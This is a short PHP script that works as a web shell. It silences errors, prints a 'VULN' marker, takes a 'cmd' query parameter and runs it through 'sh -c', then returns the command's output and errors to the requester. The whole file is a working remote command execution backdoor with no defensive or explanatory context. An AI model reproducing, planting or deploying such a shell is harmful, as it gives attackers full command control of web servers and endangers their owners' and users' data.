<?php 
@error_reporting(0);
@set_time_limit(0);
echo 'VULN';
$c = isset($_GET["cmd"]) ? $_GET["cmd"] : "";
$d = proc_open(
    "sh -c " . escapeshellarg($c),
    [1 => ["pipe", "w"], 2 => ["pipe", "w"]],
    $p
);
while ($o = fgets($p[1])) {
    echo $o;
}
while ($e = fgets($p[2])) {
    echo $e;
}
fclose($p[1]);
fclose($p[2]);
proc_close($d); ?>
